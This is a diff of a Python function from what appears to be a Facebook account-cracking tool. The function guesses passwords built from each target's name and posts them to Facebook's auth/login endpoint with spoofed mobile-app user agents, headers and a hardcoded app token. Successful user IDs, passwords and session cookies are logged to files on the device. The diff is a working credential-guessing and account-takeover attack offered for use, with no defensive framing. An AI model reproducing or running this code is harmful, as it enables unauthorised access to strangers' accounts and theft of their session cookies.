@@ -456,46 +456,49 @@ def file_sub(uid, pwx, name, meth, file):
     else:
         uax = ua[7]
     sys.stdout.write(
-        f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}PRINCE-M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
+        f'\r\033[1;37m [HERON-M{meth}\033[1;37m] \033[1;37m[{loop}\033[1;37m]>~<[\033[95m\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m\033[1;37m|\033[2;37m\033[0;00m\r');
     sys.stdout.flush()
 
-    fs = name.split(' ')[0]
+    First = name.split(" ")[0]
     try:
-        ls = name.split(' ')[1]
+        Last = name.split(" ")[1]
     except:
-        ls = fs
+        Last = "khan"
     try:
         for pw in pwx:
-            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
-                                                                                                          ls).replace(
-                'Name', name).replace('name', name.lower())
-            # try:
-            #     rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
-            #     device = uax.split("FBDV/")[1].split(";")[0]
-            #     plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
-            #                           "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
-            #     fban = uax.split("FBAN/")[1].split(";")[0]
-            #     fbpn = uax.split("FBPN/")[1].split(";")[0]
-            #     fbav = uax.split("FBAV/")[1].split(";")[0]
-            #     fbbd = uax.split("FBBD/")[1].split(";")[0]
-            #     model = dd(fbbd, device)
-            #     fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
-            #         random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
-            #     androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
-            #         random.choice(["2", "1", "0"]))
-            #     nowandroidv = uax.split("Android ")[1].split(";")[0]
-            #     useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
-            #         nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
-            #         fbav, fbverson).replace(device, model)
-            # except:
-            #     useragent = uax
-            #     model = uax.split("FBDV/")[1].split(";")[0]
+            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
+                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
+                                                                                          First.upper()).replace("LAST",
+                                                                                                                 Last.upper())
+            addid = str(uuid.uuid4())
+
+            try:
+                rdp = "FBBV/" + uax.split("FBBV/")[1].split(";")[0]
+                device = uax.split("FBDV/")[1].split(";")[0]
+                plat = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
+                                      "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
+                fban = uax.split("FBAN/")[1].split(";")[0]
+                fbpn = uax.split("FBPN/")[1].split(";")[0]
+                fbav = uax.split("FBAV/")[1].split(";")[0]
+                fbbd = uax.split("FBBD/")[1].split(";")[0]
+                model = dd(fbbd, device)
+                fbverson = str(random.choice(range(150, 300))) + ".0.0." + str(
+                    random.choice(range(17, 50))) + "." + str(random.choice(range(95, 150)))
+                androidv = str(random.choice(range(5, 10))) + "." + str(random.choice(["1", "0"])) + "." + str(
+                    random.choice(["2", "1", "0"]))
+                nowandroidv = uax.split("Android ")[1].split(";")[0]
+                useragent = uax.replace(rdp, 'FBBV/' + str(random.choice(range(100000000, 888999000)))).replace(
+                    nowandroidv, androidv).replace(fban, plat.split('|')[1]).replace(fbpn, plat.split('|')[0]).replace(
+                    fbav, fbverson).replace(device, model)
+            except:
+                useragent = uax
+                model = uax.split("FBDV/")[1].split(";")[0]
             token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             adi = str(uuid.uuid4())
             data = {
                 "adid": adi,
                 "format": "json",
-                "device_id": str(uuid.uuid4()),
+                "device_id": adi,
                 "cpl": "true",
                 "family_device_id": str(uuid.uuid4()),
                 "credentials_type": "device_based_login_password",
@@ -515,44 +518,45 @@ def file_sub(uid, pwx, name, meth, file):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             head = {
-                'User-Agent': user_agent,
+                'User-Agent': useragent,
+                'Accept': '*/*',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
+                'Connection': 'close',
+                'cache-control': 'no-cache',
+                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-FB-Connection-Type': 'WIFI',
                 'X-Tigon-Is-Retry': 'False',
-                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
-                'X-fb-device-group': '5120',
+                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'X-fb-device-group': str(random.randint(2000, 4000)),
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'X-fb-connection-token': f'{shuffled_connection_token}', }
-            url1 = 'https://b-graph.facebook.com/auth/login'
-            po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()
-            if "session_key" in po:
+                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+            url = 'https://graph.facebook.com/auth/login'
+            rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
+            if "session_key" in rq:
+                coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
+                print(f"\r\r[b r green_yellow][HERON-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}|{coki}\n")
+                open("/sdcard/PRINCE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/SD-FILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 break
-            elif "Please Confirm Email" in str(po):
+            elif "Please Confirm Email" in str(rq):
+
+                print(f"\r\r[b r green_yellow][HERON-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
+                open("/sdcard/PRINCE-OK", "a").write(uid + "|" + ps + "|" + "\n")
                 oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PRINCE-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/SD-FILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                 break
+
             else:
                 continue
         loop += 1
     except Exception as e:
         time.sleep(30)
-
-
 
 
 def ran():
